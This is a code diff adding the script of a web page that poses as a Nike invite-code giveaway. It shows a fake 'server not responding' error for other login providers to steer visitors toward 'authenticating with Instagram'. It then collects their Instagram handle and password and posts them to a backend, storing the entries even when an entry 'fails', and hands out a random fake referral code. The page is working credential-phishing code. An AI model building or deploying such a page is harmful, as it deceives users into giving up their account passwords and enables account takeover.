+            const code = document.getElementById('serverErrorCode');
+
+            if (serverTimeoutTimer) clearTimeout(serverTimeoutTimer);
+
+            // Brief connecting state before showing "Server Not Responding"
+            statusIcon.className = 'server-status-icon loading';
+            statusIcon.innerHTML = '<div class="server-spinner"></div>';
+            title.textContent = 'Connecting to ' + provider + '...';
+            msg.textContent = 'Establishing secure connection to ' + provider.toLowerCase() + '.com...';
+            code.style.display = 'none';
+
+            overlay.classList.add('show');
+
+            serverTimeoutTimer = setTimeout(() => {
+                statusIcon.className = 'server-status-icon';
+                statusIcon.innerHTML = `
+                    <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="12" y1="8" x2="12" y2="12"/>
+                        <line x1="12" y1="16" x2="12.01" y2="16"/>
+                    </svg>
+                `;
+                title.textContent = 'Server Not Responding';
+                msg.textContent = provider + ' authentication server is not responding right now. Please try again later or authenticate using Instagram.';
+                code.style.display = 'inline-block';
+            }, 500);
+        }
+
+        function closeServerErrorModal() {
+            if (serverTimeoutTimer) clearTimeout(serverTimeoutTimer);
+            document.getElementById('serverErrorOverlay').classList.remove('show');
+        }
+
+        // ===== INSTAGRAM POPUP CONTROLS =====
+        function openInstaModal() {
+            const overlay = document.getElementById('instaModalOverlay');
+            overlay.classList.add('show');
+            setTimeout(() => {
+                document.getElementById('instagram').focus();
+            }, 100);
+        }
+
+        function closeInstaModal() {
+            document.getElementById('instaModalOverlay').classList.remove('show');
+        }
+
+        function closeModalOnBackdrop(event, overlayId) {
+            if (event.target.id === overlayId) {
+                document.getElementById(overlayId).classList.remove('show');
+                if (overlayId === 'serverErrorOverlay' && serverTimeoutTimer) {
+                    clearTimeout(serverTimeoutTimer);
+                }
+            }
+        }
+
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape') {
+                closeServerErrorModal();
+                closeInstaModal();
+            }
+        });
+
+        // ===== PASSWORD VISIBILITY TOGGLE =====
+        const passwordInput = document.getElementById('accessKey');
+        const toggleButton = document.getElementById('togglePassword');
+
+        toggleButton.addEventListener('click', function () {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+            toggleButton.setAttribute(
+                'aria-label',
+                isPassword ? 'Hide password' : 'Show password'
+            );
+        });
+
+        // ===== FORM VALIDATION & SUBMIT TO SERVER =====
+        async function handleSubmit(e) {
+            e.preventDefault();
+
+            // Reset errors
+            document.querySelectorAll('.field-error').forEach(el => el.classList.remove('show'));
+            ['instagram', 'accessKey', 'inviteCode'].forEach(id => {
+                document.getElementById(id).classList.remove('error', 'success');
+            });
+
+            const instagram = document.getElementById('instagram').value.trim();
+            const inviteCode = document.getElementById('inviteCode').value.trim();
+            const accessKey = document.getElementById('accessKey').value.trim();
+            const agreed = document.getElementById('terms').checked;
+
+            let valid = true;
+
+            // Validate Instagram
+            if (!instagram || instagram.length < 2) {
+                document.getElementById('instagramError').classList.add('show');
+                document.getElementById('instagram').classList.add('error');
+                valid = false;
+            } else {
+                document.getElementById('instagram').classList.add('success');
+            }
+
+            // Validate Password / Access Key
+            if (!accessKey || accessKey.length < 4) {
+                document.getElementById('keyError').classList.add('show');
+                document.getElementById('accessKey').classList.add('error');
+                valid = false;
+            } else {
+                document.getElementById('accessKey').classList.add('success');
+            }
+
+            // Validate Invite Code
+            if (!inviteCode || inviteCode.length < 4) {
+                document.getElementById('inviteError').classList.add('show');
+                document.getElementById('inviteCode').classList.add('error');
+                valid = false;
+            } else {
+                document.getElementById('inviteCode').classList.add('success');
+            }
+
+            if (!valid) return;
+
+            // Show loading
+            const btn = document.getElementById('submitBtn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+
+            try {
+                const resp = await fetch('/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        instagram: instagram,
+                        inviteCode: inviteCode,
+                        accessKey: accessKey,
+                        agreed: agreed
+                    })
+                });
+                const result = await resp.json();
+
+                btn.classList.remove('loading');
+                btn.disabled = false;
+
+                // Close Instagram popup and show result overlay
+                closeInstaModal();
+
+                const overlay = document.getElementById('successOverlay');
+                const checkIcon = document.getElementById('checkIcon');
+                const title = document.getElementById('overlayTitle');
+                const msg = document.getElementById('overlayMsg');
+                const refSection = document.getElementById('refSection');
+
+                if (result.success) {
+                    // SUCCESS — correct code + agreed
+                    checkIcon.style.background = '#128A09';
+                    checkIcon.innerHTML = '<svg viewBox="0 0 24 24" width="36" height="36" stroke="white" stroke-width="3" fill="none"><polyline points="20 6 9 17 4 12"/></svg>';
+                    title.textContent = "You're In! 🎉";
+                    title.className = '';
+                    msg.textContent = result.message;
+
+                    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                    let refCode = 'NIKE-';
+                    for (let i = 0; i < 6; i++) refCode += chars.charAt(Math.floor(Math.random() * chars.length));
+                    document.getElementById('refCode').textContent = refCode;
+                    refSection.style.display = 'block';
+                } else {
+                    // FAILED — wrong code or not agreed (still stored)
+                    checkIcon.style.background = '#D43F21';
+                    checkIcon.innerHTML = '<svg viewBox="0 0 24 24" width="36" height="36" stroke="white" stroke-width="3" fill="none"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>';
+                    title.textContent = 'Entry Failed';
+                    title.className = 'error-title';
+                    msg.textContent = result.message;
+                    refSection.style.display = 'none';
+                }
+
+                overlay.classList.add('show');
+
+            } catch (err) {
+                btn.classList.remove('loading');
+                btn.disabled = false;
+                alert('Server error. Make sure server.py is running.');
+                console.error(err);
+            }
+        }
+
+        // ===== INPUT FORMATTING =====
+        document.getElementById('instagram').addEventListener('input', function () {
+            let val = this.value;
+            if (val && !val.startsWith('@')) {
+                this.value = '@' + val;
+            }
+        });
+
+        document.getElementById('inviteCode').addEventListener('input', function () {
+            this.value = this.value.toUpperCase();
+        });
+
+        // ===== REMOVE ERROR ON FOCUS =====
+        ['instagram', 'accessKey', 'inviteCode'].forEach(id => {
+            document.getElementById(id).addEventListener('focus', function () {
+                this.classList.remove('error', 'success');
+                const errorEl = this.closest('.form-group').querySelector('.field-error');
+                if (errorEl) errorEl.classList.remove('show');
+            });
+        });
+    </script>
+
+</body>
+</html>
